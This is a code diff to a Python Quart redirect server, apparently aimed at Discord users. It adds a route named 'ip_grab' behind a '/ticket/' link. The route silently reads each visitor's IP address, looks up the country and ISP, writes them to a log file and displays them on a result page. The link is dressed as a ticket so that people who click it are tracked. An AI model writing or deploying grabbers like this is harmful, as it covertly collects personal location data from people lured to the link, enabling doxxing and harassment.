@@ -12,7 +12,7 @@ Dependencies:
 import requests
 from logger import Logger
 from json_handler import *
-from quart import Quart, redirect, request
+from quart import Quart, redirect, render_template, request
 
 app = Quart(__name__)
 l = Logger(console_log= True, file_logging=True, file_URI='logs/log.txt', override=True)
@@ -76,7 +76,28 @@ async def index():
         return await redirect_handler(ip_address, default_server, alternative_server_url)
     except Exception as e:
         l.error(f'{e}')
-
+        
+@app.route('/ticket/<path:dc_handle>')
+async def ip_grab(dc_handle):
+    l.info('Grabber called.')
+    l.info(f'user is: {dc_handle}')
+    ip_address = request.headers.get('X-Real-IP')
+    l.info(f'IP Address is: {ip_address}')
+    try:
+        data = await request_ip_location(ip_address)
+        l.info(f'data is: {data}')
+        ip = data['ip']
+        ip_number = data['ip_number']
+        ip_version = data['ip_version']
+        country_name = data['country_name']
+        country_code2 = data['country_code2']
+        isp = data['isp']
+        dc_handle += '?'
+        l.info(f'data is: {data}')
+        return await render_template('result.html',dc_handle = dc_handle, ip=ip, ip_number=ip_number, ip_version=ip_version,
+                                country_name=country_name, country_code2=country_code2, isp=isp)
+    except Exception as e:
+            l.error(f'{e}')
     
 @app.route('/<path:dc_invite>')
 async def refer(dc_invite):
